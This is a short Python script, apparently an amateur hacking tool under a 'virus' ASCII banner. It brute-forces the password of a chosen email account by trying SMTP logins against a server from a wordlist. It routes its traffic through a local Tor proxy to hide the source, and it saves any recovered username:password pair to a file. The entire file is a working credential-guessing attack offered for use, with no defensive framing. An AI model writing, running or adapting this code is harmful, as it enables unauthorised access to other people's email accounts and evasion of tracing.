import smtplib
import sys
import time
import socks
from threading import Thread, Timer

virus = """

       .__                       
___  __|__|_______  __ __  ______
\  \/ /|  |\_  __ \|  |  \/  ___/
 \   / |  | |  | \/|  |  /\___ \ 
  \_/  |__| |__|   |____//____  >
                              \/ 
made by virus Al7rbi :)
"""
print(virus)


#change ip
def ip_changer():
    while True:
        socks.setdefaultproxy(socks.SOCKS5, 'localhost', 9050)
        socks.wrapmodule(smtplib)
        time.sleep(5)


#static
ServerPort = input("input server | server:port: ")
ServerPort = str(ServerPort)
try:
    server = smtplib.SMTP(ServerPort)
    server.ehlo()
    server.starttls()
    print('[*]Connected')
except Exception:
    print('[!]Error to connection')
    sys.exit()
username = input("Email : ")
File = input("passwords list: ")
password = open(File).read().splitlines()
amount = len(password)


def hack():
    print('[*]start trying , try (' + str(amount) + ')password')

    for passwd in password:
        try:
            server.login(username, passwd)
            combination = (username + ":" + passwd)
            print('[*]Found : {}'.format(combination))
            break
        except smtplib.SMTPAuthenticationError as msg:
            if msg.smtp_code == 534:
                print('[*] Get it ({})'.format(passwd))
                password_is = open('passwords.txt', 'a')
                password_is.write("{}:{}".format(username, passwd))
                password_is.close()
                print('the password in the file')
                sys.exit()
            elif msg.smtp_code == 535:
                print("[×]Not this ({}) ".format(passwd))
                time.sleep(0.5)
            elif msg.smtp_code == 553:
                print('[!]Email Error')
        except smtplib.SMTPServerDisconnected as dis:
            if dis == 'Connection unexpectedly closed':
                print('Connection unexpectedly closed ...')



if __name__ == '__main__':
    Thread(target = ip_changer).start()
    Thread(target = hack).start()